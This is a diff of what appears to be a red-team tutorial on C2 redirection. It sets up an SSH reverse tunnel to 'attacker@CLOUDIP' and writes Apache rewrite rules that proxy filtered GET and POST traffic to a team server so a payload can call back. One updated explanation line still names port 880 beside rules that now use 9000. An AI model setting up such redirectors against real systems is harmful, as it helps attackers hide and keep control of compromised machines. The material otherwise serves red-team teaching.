@@ -58,7 +58,7 @@ Next, we will configure the `apache2` service to forward traffic back to our tea
 
 When HTTP requests are made to the HTTP server and meet certain conditions, we want it to pass the traffic to a different port, which will then forward it to the team server. Run this command on the team server:
 
-`ssh -N -R 880:localhost:80 attacker@CLOUDIP`
+`ssh -N -R 9000:localhost:80 attacker@CLOUDIP`
 
 This command does the following:
 
@@ -86,13 +86,13 @@ This configuration block does the following:
 Next, create `.htaccess` file in `/var/www/html` and add the following content:
 ```
 RewriteEngine on
-RewriteRule ^.*$ https://localhost:880%{REQUEST_URI} [P]
+RewriteRule ^.*$ https://localhost:9000%{REQUEST_URI} [P]
 ```
 
 This `.htaccess` file does the following:
 
 - **RewriteEngine on**: Enables the runtime rewriting engine.
-- **RewriteRule ^.\*$ https://localhost:880%{REQUEST_URI} [P]**: Redirects all incoming requests to `https://localhost:880` while preserving the original request URI. The `[P]` flag tells Apache to use a proxy for this request.
+- **RewriteRule ^.\*$ https://localhost:9000%{REQUEST_URI} [P]**: Redirects all incoming requests to `https://localhost:9000` while preserving the original request URI. The `[P]` flag tells Apache to use a proxy for this request.
 
 Now that everything is configured, execute the payload we generated earlier. You should receive a callback on your team server!
 ### Redirection Rules
@@ -107,12 +107,12 @@ RewriteEngine on
 
 RewriteCond %{REQUEST_METHOD} GET [NC]
 RewriteCond %{REQUEST_URI} zon
-RewriteRule ^.*$ http://localhost:880%{REQUEST_URI} [P,L]
+RewriteRule ^.*$ http://localhost:9000%{REQUEST_URI} [P,L]
   
 
 RewriteCond %{REQUEST_METHOD} POST [NC]
 RewriteCond %{REQUEST_URI} zon
-RewriteRule ^.*$ http://localhost:880%{REQUEST_URI} [P,L]
+RewriteRule ^.*$ http://localhost:9000%{REQUEST_URI} [P,L]
 
 ```
 
@@ -120,5 +120,5 @@ Explanation:
 
 - **RewriteCond %{REQUEST_METHOD} GET [NC]**: This condition checks if the request method is GET. The `[NC]` flag makes this condition case-insensitive.
 - **RewriteCond %{REQUEST_URI} zon**: This condition checks if the request URI contains "zon".
-- **RewriteRule ^.\*$ http://localhost:880%{REQUEST_URI} [P,L]**: This rule forwards the request to `http://localhost:880` while preserving the original request URI. The `[P]` flag tells Apache to use a proxy, and the `[L]` flag ensures this is the last rule to be processed if the conditions are met.
+- **RewriteRule ^.\*$ http://localhost:9000%{REQUEST_URI} [P,L]**: This rule forwards the request to `http://localhost:880` while preserving the original request URI. The `[P]` flag tells Apache to use a proxy, and the `[L]` flag ensures this is the last rule to be processed if the conditions are met.
 
